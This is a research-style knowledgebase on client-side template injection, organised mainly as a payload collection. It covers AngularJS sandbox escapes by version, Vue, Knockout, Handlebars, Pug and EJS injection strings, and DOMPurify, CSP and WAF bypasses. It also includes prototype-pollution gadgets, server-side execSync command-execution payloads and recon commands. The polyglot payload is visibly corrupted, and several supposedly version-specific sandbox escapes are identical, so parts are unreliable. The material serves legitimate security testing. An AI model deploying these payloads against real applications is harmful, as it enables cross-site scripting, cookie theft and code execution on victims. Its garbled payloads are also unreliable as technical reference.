# Client-Side Template Injection (CSTI) — Research-Grade Knowledgebase

> **Version:** 1.0 | **Last Updated:** 2026-05-23
> **Scope:** Advanced Bug Bounty Hunting, Black-Box Testing, Penetration Testing
> **Sources:** PortSwigger Research, HackTricks, PayloadsAllTheThings, BlackFan Prototype Pollution Wiki, Tiny-XSS-Payloads, XSS-Payload-List, and community research.

---

## Table of Contents

1. [Basics](#basics)
2. [CSTI Theory](#csti-theory)
3. [Template Engines Overview](#template-engines-overview)
4. [AngularJS CSTI](#angularjs-csti)
5. [Angular Sandbox Escapes](#angular-sandbox-escapes)
6. [Vue.js CSTI](#vuejs-csti)
7. [React Gadget Chains](#react-gadget-chains)
8. [KnockoutJS Payloads](#knockoutjs-payloads)
9. [Handlebars Payloads](#handlebars-payloads)
10. [Mustache Payloads](#mustache-payloads)
11. [Nunjucks Payloads](#nunjucks-payloads)
12. [Pug Payloads](#pug-payloads)
13. [EJS Payloads](#ejs-payloads)
14. [Expression Injection](#expression-injection)
15. [constructor.constructor Chains](#constructorconstructor-chains)
16. [Function Constructor Abuse](#function-constructor-abuse)
17. [Template Literal Abuse](#template-literal-abuse)
18. [DOM-Based CSTI](#dom-based-csti)
19. [Client-Side Rendering Abuse](#client-side-rendering-abuse)
20. [CSP Bypass Chains](#csp-bypass-chains)
21. [Prototype Pollution + CSTI Chains](#prototype-pollution--csti-chains)
22. [XSS + CSTI Chains](#xss--csti-chains)
23. [RCE Chains](#rce-chains)
24. [Gadget Chains](#gadget-chains)
25. [Browser Quirks](#browser-quirks)
26. [Real World Case Studies](#real-world-case-studies)
27. [Fuzzing Payloads](#fuzzing-payloads)
28. [Automation Workflows](#automation-workflows)
29. [Recon Methodology](#recon-methodology)
30. [Nuclei Templates](#nuclei-templates)
31. [Tools and Scanners](#tools-and-scanners)
32. [Advanced Research](#advanced-research)
33. [Bug Bounty Writeups](#bug-bounty-writeups)
34. [Payload Collections](#payload-collections)
35. [WAF Bypasses](#waf-bypasses)
36. [Detection Techniques](#detection-techniques)
37. [References](#references)

---

## Basics

### What is Client-Side Template Injection (CSTI)?

Client-Side Template Injection (CSTI) occurs when a web application using a client-side template framework (e.g., AngularJS, Vue.js) dynamically embeds user input into the DOM. The framework's template engine scans the DOM for template expressions and executes them. If an attacker can inject malicious template expressions, they achieve arbitrary JavaScript execution (XSS) within the victim's browser.

### CSTI vs. SSTI

| Feature | CSTI | SSTI |
|---------|------|------|
| **Execution Environment** | Victim's browser (client-side) | Web server (server-side) |
| **Impact** | XSS, session hijacking, DOM data theft | RCE, server compromise, data exfiltration |
| **Common Frameworks** | AngularJS, Vue.js, KnockoutJS | Jinja2, Twig, Freemarker, EJS |
| **Detection** | `{{7*7}}` renders `49` | `{{7*7}}` renders `49` |

### Key Concepts

- **Template Expression:** Syntax like `{{ expr }}` that the framework evaluates.
- **Sandbox:** A security mechanism (e.g., AngularJS sandbox) that restricts access to dangerous objects like `window` or `document`.
- **Sink:** A function or DOM property that executes or renders user input (e.g., `innerHTML`, `v-html`, `$compile`).
- **Source:** User-controlled input (URL parameters, form fields, cookies, `localStorage`).

---

## CSTI Theory

### How CSTI Works

1. **Framework Bootstraps:** The client-side framework (AngularJS, Vue.js) loads and scans the DOM for its template syntax.
2. **User Input Reflected:** Attacker-controlled input is reflected into the DOM, either via server-side rendering or client-side DOM manipulation.
3. **Template Engine Evaluates:** The framework's template engine parses the reflected input and evaluates any template expressions it finds.
4. **Code Execution:** The injected expression executes arbitrary JavaScript, leading to XSS.

### Why CSTI is Dangerous

- **Bypasses HTML Encoding:** Even if the server HTML-encodes the input, the template engine may decode entities before evaluation.
- **CSP Bypass Potential:** Template engines often use `eval`-like functionality (`Function` constructor), which can bypass CSP if `unsafe-eval` is allowed.
- **No Server Interaction:** Purely client-side; WAFs inspecting server traffic may miss it.

### Common Injection Points

- URL query parameters reflected into `ng-app` or Vue mount elements.
- User-generated content stored and rendered by the framework.
- Error messages (e.g., OIDC `error_description`) rendered via templates.
- Search result pages that echo the query string.

---

## Template Engines Overview

### Client-Side Template Engines

| Engine | Delimiters | Sandbox | Common Use |
|--------|------------|---------|------------|
| **AngularJS (1.x)** | `{{ }}` | Yes (removed in 1.6) | Legacy SPAs |
| **Vue.js (2/3)** | `{{ }}` | No (expression sandbox) | Modern SPAs |
| **KnockoutJS** | `{{ }}` or `data-bind` | No | MVVM bindings |
| **Handlebars** | `{{ }}` | No (logic-less) | Client/server templating |
| **Mustache** | `{{ }}` | No (logic-less) | Client/server templating |
| **Nunjucks** | `{{ }}` | No | Mozilla's templating engine |
| **Pug (Jade)** | `#{ }`, `=`, `!=` | No | Node.js server-side |
| **EJS** | `<%= %>`, `<%- %>` | No | Node.js server-side |
| **Alpine.js** | `x-data`, `x-html` | No | Lightweight reactivity |
| **Mavo** | `{{ }}` | No | Data-driven web apps |

### Fingerprinting Template Engines

Look for these markers in HTML source or JavaScript globals:

```html
<!-- AngularJS -->
<div ng-app ng-controller="MyCtrl">
<div data-ng-app>

<!-- Vue.js -->
<div id="app" v-if="condition">
<div v-html="userContent">

<!-- KnockoutJS -->
<div data-bind="text: username">

<!-- Alpine.js -->
<div x-data="{ open: false }">

<!-- Mavo -->
<div mv-app mv-storage="local">
```

Check JavaScript globals in browser console:

```javascript
// AngularJS
typeof angular !== 'undefined'

// Vue.js
typeof Vue !== 'undefined'

// KnockoutJS
typeof ko !== 'undefined'

// Alpine.js
document.querySelector('[x-data]')
```

---

## AngularJS CSTI

### Detection

AngularJS scans DOM nodes with `ng-app` (or `data-ng-app`) and evaluates expressions inside `{{ }}`.

**Basic Probe:**
```
{{7*7}}
```
If the page renders `49`, CSTI is confirmed.

### Exploitation (Modern AngularJS 1.6+)

AngularJS removed the sandbox in version 1.6. Exploitation is straightforward:

```javascript
// Direct constructor access
{{constructor.constructor('alert(1)')()}}

// Using $event (works in event directives)
<input ng-focus=$event.view.alert('XSS')>

// Using $on
{{$on.constructor('alert(1)')()}}

// Using $eval
{{$eval.constructor('alert(1)')()}}
```

### Exploitation (Pre-1.6 with Sandbox)

Older versions require sandbox escape. See [Angular Sandbox Escapes](#angular-sandbox-escapes).

### Directive-Based Payloads

AngularJS directives can be abused even when `{{ }}` is filtered:

```html
<!-- ng-init -->
<div ng-init="constructor.constructor('alert(1)')()"></div>

<!-- ng-focus -->
<input ng-focus="$event.view.alert(1)">

<!-- ng-click -->
<button ng-click="constructor.constructor('alert(1)')()">Click</button>

<!-- ng-mouseover -->
<div ng-mouseover="constructor.constructor('alert(1)')()">Hover</div>

<!-- ng-bind-html (if trusted) -->
<div ng-bind-html="userContent"></div>
```

### CSP Bypass with AngularJS

If CSP allows `unsafe-eval`, AngularJS can bypass nonce-based CSP:

```javascript
// Extract nonce and execute
{{constructor.constructor('alert(document.currentScript.nonce)')()}}
```

### DOMPurify Bypass

AngularJS attributes bypass DOMPurify because they are not standard event handlers:

```html
<!-- DOMPurify allows data-ng-* attributes -->
<div data-ng-app>
  <b data-ng-init="constructor.constructor('alert(1)')()"></b>
</div>

<!-- Class-based directive injection -->
<div class="ng-init:constructor.constructor('alert(1)')()"></div>
```

### AngularJS Mutation XSS (mXSS)

PortSwigger research discovered that AngularJS parsing can cause mutation XSS:

```html
<!-- Input -->
<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">

<!-- Mutated Output -->
"="<iframe onload="alert(1)"></iframe>
```

Other mutation vectors:
```html
<x < x="&lt;iframe onload=alert(0)&gt;">
<x = x="&lt;iframe onload=alert(0)&gt;">
<x ' x="&lt;iframe onload=alert(0)&gt;">
```

### AngularJS Template Tag Mutation

VueJS/AngularJS removes `<template>` tags, leaving inner markup:

```html
<!-- Input -->
<xyz<img/src onerror=alert(1)>>

<!-- Output -->
<img src="" onerror="alert(1)">&gt;
```

### SVG-based Mutation with CSP Bypass

```html
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;img/src/&Tab;@error=$event.path.pop().alert(1)&gt;</noscript></b></svg>
```

---

## Angular Sandbox Escapes

### History

AngularJS implemented a sandbox to prevent access to dangerous objects in template expressions. It was bypassed multiple times and finally removed in v1.6.

### Sandbox Bypass Payloads by Version

#### AngularJS 1.0.1 - 1.1.5
```javascript
{{constructor.constructor('alert(1)')()}}
```

#### AngularJS 1.2.0 - 1.2.18
```javascript
{{a=toString().constructor.prototype;a.charAt=[].join;$eval('a=alert(1)');}}
```

#### AngularJS 1.2.19 - 1.2.23
```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

#### AngularJS 1.2.24 - 1.2.29
```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

#### AngularJS 1.3.0 - 1.3.9
```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

#### AngularJS 1.3.10 - 1.3.15
```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

#### AngularJS 1.3.16 - 1.3.20
```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

#### AngularJS 1.4.0 - 1.4.5
```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

#### AngularJS 1.4.6 - 1.4.9
```javascript
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

#### AngularJS 1.4.10 - 1.5.0
```javascript
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

#### AngularJS 1.5.1 - 1.5.8
```javascript
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

#### AngularJS 1.5.9 - 1.5.11
```javascript
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

#### AngularJS 1.6.0+ (No Sandbox)
```javascript
{{constructor.constructor('alert(1)')()}}
```

### Research Notes

- The sandbox was never intended as a security boundary by the AngularJS team, but the community treated it as one.
- Each bypass typically abused prototype manipulation or array method reassignment.
- The `orderBy` filter was frequently used in bypasses combined with `$event.path`.

---

## Vue.js CSTI

### Detection

Vue.js uses `{{ }}` for text interpolation and `v-html` for raw HTML.

**Basic Probe:**
```
{{7*7}}
```

### Vue.js 2.x Payloads

```javascript
// Standard payload
{{constructor.constructor('alert(1)')()}}

// Using _c (createElement function)
{{_c.constructor('alert(1)')()}}

// Using _v (createTextVNode)
{{_v.constructor('alert(1)')()}}

// Using _s (toString)
{{_s.constructor('alert(1)')()}}

// Using $event in directives
<input @focus="$event.target.ownerDocument.defaultView.alert(1)">

// Using $options
{{$options.constructor('alert(1)')()}}
```

### Vue.js 3.x Payloads

```javascript
// Using _openBlock
{{_openBlock.constructor('alert(1)')()}}

// Using _createElementBlock
{{_createElementBlock.constructor('alert(1)')()}}

// Using _Vue.h (Vue 3 global)
{{_Vue.h.constructor('alert(1)')()}}

// Using _toDisplayString
{{_toDisplayString.constructor('alert(1)')()}}
```

### Vue.js CSP Bypass

```javascript
// Nonce extraction with unsafe-eval
{{_c.constructor`alert(document.currentScript.nonce)`()}}

// Vue 3
{{_Vue.h.constructor`alert(document.currentScript.nonce)`()}}
```

### Vue.js v-html Abuse

If user input reaches `v-html`, it's straightforward XSS:

```html
<div v-html="userInput"></div>
```

Payload:
```
<img src=x onerror=alert(1)>
```

### Vue.js Script Gadgets (PortSwigger Research)

Vue.js can be used as a script gadget to bypass sanitizers:

```html
<!-- Mutation XSS via attribute parsing -->
<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">

<!-- Template tag removal -->
<template><script>alert(1)</script></template>

<!-- SVG mutation -->
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=alert(1)&gt;</noscript></b></svg>
```

### Vue.js + Prototype Pollution

```javascript
// Pollute Vue config
Object.prototype.template = '<script>alert(1)</script>'

// Pollute data property
Object.prototype.data = { __proto__: { isAdmin: true } }
```

### Server-Side + Client-Side Mixing

When server-side rendering mixes with Vue client-side templates:

```php
<!-- Vulnerable: Server reflects user input into Vue template -->
<div id="app">
  <?= htmlspecialchars($_GET['name']) ?>
  {{ message }}
</div>
```

Attack:
```
?name={{constructor.constructor('alert(1)')()}}
```

**Fix:** Use `v-pre` to skip compilation:
```html
<div v-pre><?= htmlspecialchars($_GET['name']) ?></div>
```

---

## React Gadget Chains

### React and CSTI

React itself does not use template expressions like `{{ }}`. JSX is compiled to JavaScript at build time. However, React applications can be vulnerable to equivalent attacks through:

1. **`dangerouslySetInnerHTML`**
2. **Dynamic component rendering**
3. **JSONP / script gadget injection**

### dangerouslySetInnerHTML

```jsx
// Vulnerable
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

Payload:
```html
<img src=x onerror=alert(1)>
```

### React Script Gadgets

React props can be abused if attacker controls JSON data:

```html
<!-- If attacker controls data-react-props -->
<div data-react-props="{'dangerouslySetInnerHTML':{'__html':'<img src=x onerror=alert(1)>'}}">
```

### React + CSP

React's `dangerouslySetInnerHTML` bypasses CSP if `unsafe-inline` is present. With `strict-dynamic`, nonce-based CSP can be bypassed if the attacker can inject a script with a valid nonce.

### React Server Components (RSC) Injection

In React Server Components, if user input is serialized and passed to the client without proper sanitization, it can lead to XSS:

```javascript
// Malformed RSC payload
{"type":"div","props":{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}}
```

---

## KnockoutJS Payloads

### Detection

KnockoutJS uses `data-bind` attributes and `{{ }}` in some configurations.

```html
<div data-bind="text: username"></div>
```

### Basic Payloads

```javascript
// If reflection lands inside data-bind
<div data-bind="text: constructor.constructor('alert(1)')()"></div>

// Using $root
{{$root.constructor.constructor('alert(1)')()}}

// Using $data
{{$data.constructor.constructor('alert(1)')()}}
```

### KnockoutJS + Prototype Pollution

From BlackFan's research:

```
?__proto__[4]=a':1,[alert(1)]:1,'b
&__proto__[5]=,
```

This pollutes `Array.prototype` to inject KnockoutJS bindings.

### Advanced KnockoutJS

```javascript
// Template injection via foreach
<div data-bind="foreach: { data: items, as: 'item' }">
  <div data-bind="text: item.constructor.constructor('alert(1)')()"></div>
</div>
```

---

## Handlebars Payloads

### Client-Side Handlebars

Handlebars is logic-less but supports helpers. If custom helpers are registered, they can be abused.

### Basic Payloads

```javascript
// If Handlebars compiles user input
{{constructor.constructor('alert(1)')()}}

// Using @root
{{@root.constructor.constructor('alert(1)')()}}

// Using helpers if available
{{#with "constructor"}}{{#with ../constructor}}{{../constructor.constructor("alert(1)")()}}{{/with}}{{/with}}
```

### Handlebars + Prototype Pollution

```javascript
// Pollute helper options
Object.prototype.name = '<img src=x onerror=alert(1)>'
```

---

## Mustache Payloads

### Client-Side Mustache

Mustache is logic-less and generally safer, but if user input is used as template source:

```javascript
// If template source is user-controlled
var template = userInput;
Mustache.render(template, data);
```

Payload:
```
{{constructor.constructor('alert(1)')()}}
```

---

## Nunjucks Payloads

### Client-Side Nunjucks

Nunjucks supports `{{ }}` and can execute JavaScript in certain configurations.

### Payloads

```javascript
// Basic
{{constructor.constructor('alert(1)')()}}

// Using range
{{range.constructor('alert(1)')()}}

// Global access
{{global.process.mainModule.require('child_process').execSync('id').toString()}}
```

---

## Pug Payloads

### Client-Side Pug (Jade)

Pug is primarily server-side but can run client-side via `pug.compile()`.

### Payloads

```pug
// If user input reaches Pug template
#{global.process.mainModule.require('child_process').execSync('id').toString()}

// JavaScript injection
- var x = eval('alert(1)')
```

### Pug Client-Side Compilation

```javascript
// Vulnerable: compiling user input
var fn = pug.compile(userInput);
fn();
```

---

## EJS Payloads

### Client-Side EJS

EJS allows embedded JavaScript with `<% %>` tags.

### Payloads

```javascript
// Basic RCE (Node.js context)
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>

// XSS in browser context
<% alert(1) %>
```

### EJS Client-Side Template Injection

```javascript
// If template string is user-controlled
var html = ejs.render(userInput, data);
```

Payload:
```
<%= constructor.constructor('alert(1)')() %>
```

---

## Expression Injection

### Generic Expression Injection Techniques

When user input is evaluated as JavaScript expression:

```javascript
// Direct eval
eval(userInput)

// Function constructor
new Function(userInput)()

// setTimeout/setInterval
setTimeout(userInput, 0)

// Template literals (indirect eval)
`${userInput}`
```

### Bypassing Expression Filters

```javascript
// Using concatenation
'al'+'ert(1)'

// Using String.fromCharCode
String.fromCharCode(97,108,101,114,116)+'(1)'

// Using Unicode escapes
\u0061\u006c\u0065\u0072\u0074(1)

// Using base64 atob
eval(atob('YWxlcnQoMSk='))
```

---

## constructor.constructor Chains

### The Universal Gadget

In JavaScript, every object has a `constructor` property. Chaining `constructor.constructor` reaches the `Function` constructor:

```javascript
// Basic chain
{}.constructor.constructor('alert(1)')()

// From string
''.constructor.constructor('alert(1)')()

// From array
[].constructor.constructor('alert(1)')()

// From number
(1).constructor.constructor('alert(1)')()

// From boolean
true.constructor.constructor('alert(1)')()
```

### Framework-Specific Chains

```javascript
// AngularJS
{{constructor.constructor('alert(1)')()}}

// Vue.js
{{_c.constructor('alert(1)')()}}

// KnockoutJS
{{$data.constructor.constructor('alert(1)')()}}
```

### Obfuscated Chains

```javascript
// Using bracket notation
{}['constructor']['constructor']('alert(1)')()

// Using unicode
{}['\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072']['\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072']('alert(1)')()

// Using Object.getPrototypeOf
Object.getPrototypeOf({}).constructor.constructor('alert(1)')()
```

---

## Function Constructor Abuse

### Direct Abuse

```javascript
// Basic
Function('alert(1)')()

// With apply
Function.prototype.call.apply(Function, ['alert(1)'])()

// With bind
Function.bind(null, 'alert(1)')()

// With Reflect
Reflect.construct(Function, ['alert(1)'])()
```

### Indirect Abuse via Template Literals

```javascript
// Tagged template literal
Function`alert(1)```

// With String.raw
String.raw`alert(1)`
```

### Function Constructor in CSP

If CSP allows `unsafe-eval`, the Function constructor is permitted:

```javascript
// Bypass nonce-CSP
Function('alert(document.currentScript.nonce)')()
```

---

## Template Literal Abuse

### ES6 Template Literal Injection

Template literals can execute expressions:

```javascript
// Basic injection
`${alert(1)}`

// Constructor abuse
`${constructor.constructor('alert(1)')()}`

// With user input
const userInput = '${alert(1)}';
eval(`Hello ${userInput}`);
```

### Tagged Template Literals

```javascript
// Abusing String.raw
String.raw`<script>alert(1)</script>`

// Custom tag abuse
const tag = (strings, ...values) => eval(values.join(''));
tag`alert(1)`;
```

### DOMPurify Template Literal Bypass

CVE-2025-26791: DOMPurify with `SAFE_FOR_TEMPLATES` enabled:

```javascript
DOMPurify.sanitize('<div>${constructor.constructor("alert(1)")()}</div>', {
  SAFE_FOR_TEMPLATES: true
});
```

---

## DOM-Based CSTI

### Sources and Sinks

**Sources:**
- `location.hash`
- `location.search`
- `document.URL`
- `document.referrer`
- `window.name`
- `localStorage` / `sessionStorage`
- `postMessage`

**Sinks:**
- `innerHTML`
- `outerHTML`
- `insertAdjacentHTML`
- `document.write`
- `eval()`
- `setTimeout()` / `setInterval()`
- `location.href`
- `location.replace()`

### DOM-Based AngularJS

```javascript
// Vulnerable: reading hash into template
$scope.template = location.hash.slice(1);
```

Payload:
```
#{{constructor.constructor('alert(1)')()}}
```

### DOM-Based Vue.js

```javascript
// Vulnerable: mounting on user-controlled HTML
new Vue({
  el: '#app',
  template: document.getElementById('user-content').innerHTML
});
```

### jQuery $() Selector Abuse

```javascript
// Vulnerable: user input in jQuery selector
$(location.hash).scrollIntoView();
```

Payload:
```
#<img src onerror=alert(1)>
```

---

## Client-Side Rendering Abuse

### Shadow DOM Injection

```javascript
// Injecting into shadow DOM
document.querySelector('custom-element').shadowRoot.innerHTML = payload;
```

### Web Components

```javascript
// Vulnerable custom element
class XSSElement extends HTMLElement {
  connectedCallback() {
    this.innerHTML = location.search.slice(1);
  }
}
customElements.define('xss-element', XSSElement);
```

### MutationObserver Abuse

```javascript
// Observing DOM mutations for payload execution
new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    eval(mutation.target.textContent);
  });
}).observe(document.body, { childList: true, subtree: true });
```

---

## CSP Bypass Chains

### CSP + AngularJS

If CSP includes `unsafe-eval`, AngularJS expressions execute freely:

```
Content-Security-Policy: script-src 'self' 'unsafe-eval';
```

Payload:
```javascript
{{constructor.constructor('alert(1)')()}}
```

### CSP + Vue.js

Same principle with Vue.js:

```javascript
{{_c.constructor('alert(1)')()}}
```

### Nonce Reuse

If nonce is predictable or reused:

```html
<script nonce="PREDICTABLE">
  {{constructor.constructor('alert(1)')()}}
</script>
```

### JSONP Endpoints

If CSP allows a domain with JSONP:

```html
<script src="https://trusted.com/jsonp?callback=alert(1)"></script>
```

### AngularJS `ng-csp` Directive

```html
<div ng-csp ng-app>
  {{constructor.constructor('alert(1)')()}}
</div>
```

Note: `ng-csp` disables some AngularJS features but doesn't prevent CSTI if `unsafe-eval` is in CSP.

---

## Prototype Pollution + CSTI Chains

### Overview

Prototype Pollution can modify JavaScript object prototypes, affecting template engine behavior.

### Vue.js Prototype Pollution Gadgets

```javascript
// Pollute template
Object.prototype.template = '<script>alert(1)</script>'

// Pollute v-if
Object.prototype['v-if'] = "_c.constructor('alert(1)')()"

// Pollute attrs
Object.prototype.attrs = [{ name: 'src', value: 'x' }]
Object.prototype.xxx = 'data:,alert(1)//'
Object.prototype.is = 'script'

// Pollute v-bind:class
Object.prototype['v-bind:class'] = "''.constructor.constructor('alert(1)')()"
```

### AngularJS Prototype Pollution

```javascript
// Pollute $rootScope
Object.prototype.$root = { constructor: { constructor: Function } }
```

### jQuery + Prototype Pollution → CSTI

```javascript
// Pollute innerHTML
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'

// Trigger via jQuery
$('div').html('anything')
```

### DOMPurify Bypass via Prototype Pollution

```javascript
// Pollute ALLOWED_ATTR
Object.prototype.ALLOWED_ATTR = ['onerror', 'src']

// Pollute documentMode (IE quirks)
Object.prototype.documentMode = 9
```

---

## XSS + CSTI Chains

### Reflected XSS → CSTI

1. Find reflected XSS that HTML-encodes output.
2. Inject template expression instead of HTML tags.
3. Framework evaluates expression, achieving XSS.

### Stored XSS → CSTI

1. Store payload in user profile, comment, etc.
2. When rendered by framework, template expression executes.
3. Affects all users viewing the content.

### DOM XSS → CSTI

1. User input reaches DOM sink (e.g., `innerHTML`).
2. Framework re-parses the DOM and evaluates expressions.
3. Achieve XSS without server interaction.

### mXSS → CSTI

1. Inject benign-looking HTML that mutates after DOM insertion.
2. Framework parses mutated DOM containing template expressions.
3. Execute XSS.

---

## RCE Chains

### Node.js + EJS/Handlebars/Pug SSTI → CSTI

While CSTI is client-side, similar templates on the server can lead to RCE:

```javascript
// EJS RCE
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>

// Handlebars RCE
{{#with "constructor"}}{{#with ../constructor}}{{../constructor.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}{{/with}}{{/with}}

// Pug RCE
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
```

### Client-Side RCE (via Electron/Node Integration)

If the app runs in Electron with `nodeIntegration`:

```javascript
{{constructor.constructor('require("child_process").execSync("id")')()}}
```

---

## Gadget Chains

### Vue.js Script Gadgets

From PortSwigger research:

```html
<!-- Attribute mutation -->
<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">

<!-- Template tag stripping -->
<template><script>alert(1)</script></template>

<!-- SVG nesting mutation -->
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=alert(1)&gt;</noscript></b></svg>

<!-- CSP bypass with @error -->
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;img/src/&Tab;@error=$event.path.pop().alert(1)&gt;</noscript></b></svg>
```

### AngularJS Script Gadgets

```html
<!-- data-ng-* bypasses DOMPurify -->
<div data-ng-app>
  <b data-ng-init="constructor.constructor('alert(1)')()"></b>
</div>

<!-- class-based directive -->
<div class="ng-init:constructor.constructor('alert(1)')()"></div>

<!-- orderBy filter abuse -->
<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```

### jQuery Script Gadgets

```javascript
// $() selector → innerHTML
$(userInput)

// $.getScript with polluted prototype
Object.prototype.url = 'data:,alert(1)//'
Object.prototype.dataType = 'script'
```

### Google Closure Gadgets

```javascript
// CLOSURE_BASE_PATH pollution
Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//'

// TrustedTypes pollution
Object.prototype.trustedTypes = 'x'
Object.prototype.emptyHTML = '<img src=x onerror=alert(1)>'
```

---

## Browser Quirks

### Charset Bypass

Missing charset declarations can lead to XSS:

```html
<meta charset="x-imap4-modified-utf7">
&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
```

### Blob URL Charset Inheritance

```javascript
const html = `<img src="src\x1b$@">text\x1b(B<img src="onerror=alert(origin)//">`;
const blob = new Blob([html], { type: "text/html" }); // missing charset
window.open(URL.createObjectURL(blob));
```

### innerHTML vs. DOMParser Differences

```javascript
// innerHTML executes scripts in certain contexts
const div = document.createElement('div');
div.innerHTML = '<img src=x onerror=alert(1)>'; // executes

// DOMParser does not execute by default
const parser = new DOMParser();
const doc = parser.parseFromString('<img src=x onerror=alert(1)>', 'text/html');
```

### SVG in img src

```html
<!-- SVG with embedded script -->
<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>">
```

### Template Tag Behavior

```javascript
// Content inside <template> is inert
template.content.querySelector('script'); // script not executed

// But Vue/Angular remove template tags, making content active
```

---

## Real World Case Studies

### Case Study 1: Vue.js OIDC error_description CSTI

**Target:** Private bug bounty program with Vue.js OIDC error page.
**Vulnerability:** `error_description` parameter rendered in Vue template.
**Payload:**
```
{{"".constructor.constructor("alert(document.domain)")()}}
```
**Impact:** Unauthenticated XSS → Account takeover via SSO gadget chain.
**Researcher:** Lauritz Holtmann (2023).

### Case Study 2: Wiki.js Stored CSTI

**Target:** Wiki.js <= 2.5.302
**Vulnerability:** Mustache expressions escaped before DOMPurify, allowing invalid HTML tag bypass.
**Payload:**
```html
<xyzabcd>
{{constructor.constructor('alert(1)')()}}
```
**Impact:** Stored XSS, JWT theft due to missing HttpOnly flag.
**CVE:** GHSA-xjcj-p2qv-q3rf

### Case Study 3: AngularJS CSP Bypass

**Target:** Application with strict CSP and DOMPurify.
**Vulnerability:** AngularJS `data-ng-init` bypassed DOMPurify whitelist.
**Payload:**
```html
<div data-ng-app>
  <b data-ng-init="constructor.constructor('alert(1)')()"></b>
</div>
```
**Impact:** CSP bypass, XSS execution.
**Researcher:** PortSwigger Research.

### Case Study 4: Vue.js + Cloudflare WAF Bypass

**Target:** Application behind Cloudflare WAF.
**Vulnerability:** Vue.js attribute mutation caused mXSS.
**Payload:**
```html
<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">
```
**Impact:** WAF bypass, XSS execution.
**Researcher:** PortSwigger Research (Gareth Heyes, Lewis Ardern, PwnFunction).

---

## Fuzzing Payloads

### Generic CSTI Probes

```
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
${7*'7'}
[[7*7]]
{7*7}
```

### Framework-Specific Probes

```javascript
// AngularJS
{{1+1}}
{{'a'.constructor.prototype}}
{{$eval}}

// Vue.js
{{1+1}}
{{_c}}
{{_openBlock}}

// KnockoutJS
{{$data}}
{{$root}}

// Handlebars
{{@root}}
{{this}}

// Nunjucks
{{range}}
{{global}}
```

### Polyglot Payloads

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0telerik%0telerik%0DaA0telerik//telerik\telerik"telerik>telerik<svg/telerik%0DaA0telerik/telerik>/telerik</telerik/onload='alert()`//
```

### Context-Aware Payloads

```html
<!-- HTML context -->
<img src=x onerror=alert(1)>

<!-- Attribute context -->
" onmouseover=alert(1) "

<!-- JavaScript context -->
';alert(1);'

<!-- Template context -->
{{constructor.constructor('alert(1)')()}}

<!-- URL context -->
javascript:alert(1)
```

---

## Automation Workflows

### Manual Testing Workflow

1. **Identify Framework:** Look for `ng-app`, `v-` directives, `data-bind`, etc.
2. **Probe for CSTI:** Inject `{{7*7}}` and check if `49` is rendered.
3. **Determine Version:** Check JavaScript files or use `angular.version`.
4. **Select Payload:** Use version-specific payload (sandbox escape for <1.6).
5. **Bypass Defenses:** Try DOMPurify bypasses, CSP bypasses, WAF evasion.
6. **Escalate Impact:** Chain with prototype pollution, XSS, or account takeover.

### Automated Scanning with Nuclei

```yaml
# Example Nuclei template for AngularJS CSTI
id: angularjs-csti

info:
  name: AngularJS Client-Side Template Injection
  author: yourname
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?q={{7*7}}"
    matchers:
      - type: word
        words:
          - "49"
        part: body
```

### Recon Automation

```bash
# Find AngularJS apps
gau target.com | grep -i angular

# Find Vue.js apps
gau target.com | grep -i vue

# Find template delimiters in responses
curl -s "https://target.com/?q={{7*7}}" | grep -o "49"
```

---

## Recon Methodology

### Step 1: Technology Fingerprinting

```bash
# Wappalyzer / BuiltWith
wappalyzer https://target.com

# Manual inspection
curl -s https://target.com | grep -E "(ng-app|v-|data-bind|x-data)"

# JavaScript globals
# Open browser console and check:
typeof angular !== 'undefined'
typeof Vue !== 'undefined'
typeof ko !== 'undefined'
```

### Step 2: Identify Injection Points

- URL parameters reflected in page body.
- Form inputs echoed in responses.
- Error messages (404, 500, OIDC errors).
- Search results pages.
- User profiles, comments, reviews.

### Step 3: Confirm CSTI

```
# Basic probe
https://target.com/?q={{7*7}}

# Check source for "49"
```

### Step 4: Framework Version Detection

```javascript
// AngularJS
angular.version

// Vue.js
Vue.version

// Check CDN URLs for version numbers
